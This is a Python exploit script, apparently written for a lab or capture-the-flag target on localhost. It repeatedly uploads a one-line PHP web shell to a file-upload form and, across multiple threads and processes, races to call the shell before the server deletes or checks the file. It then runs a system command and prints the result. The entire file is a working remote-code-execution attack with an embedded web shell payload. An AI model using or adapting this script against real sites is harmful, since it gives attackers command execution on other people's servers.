import requests
import threading
import multiprocessing
import os
import io

TARGET = 'http://127.0.0.1:8089'
UPLOAD_URL = f'{TARGET}/index.php'
SHELL_URL = f'{TARGET}/uploads/shell.php?0=uname -a'
FIELD_NAME = 'image'
FILENAME = 'shell.php'

SHELL_PAYLOAD = b"<?=`$_GET[0]`?>"

total_processes = 4
attempts_per_process = 20

def upload_file():
    file_data = io.BytesIO(SHELL_PAYLOAD)
    files = {
        FIELD_NAME: (FILENAME, file_data, 'application/x-php')
    }
    try:
        requests.post(UPLOAD_URL, files=files, timeout=5)
    except:
        pass

def hit_shell():
    try:
        r = requests.get(SHELL_URL, timeout=2)
        if r.status_code == 200 and "<?=" not in r.text:
            print("\n[🎯] SUCCESS! Shell aktif!")
            print("[🌐]", SHELL_URL)
            print("[📟]", r.text.strip())
            os._exit(0)
    except:
        pass

def race_once():
    t1 = threading.Thread(target=upload_file)
    t2 = threading.Thread(target=hit_shell)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def race_loop_child(attempts):
    for i in range(attempts):
        print(f"[{os.getpid()}] Attempt #{i+1}")
        race_once()

if __name__ == '__main__':
    procs = []
    for _ in range(total_processes):
        p = multiprocessing.Process(target=race_loop_child, args=(attempts_per_process,))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()
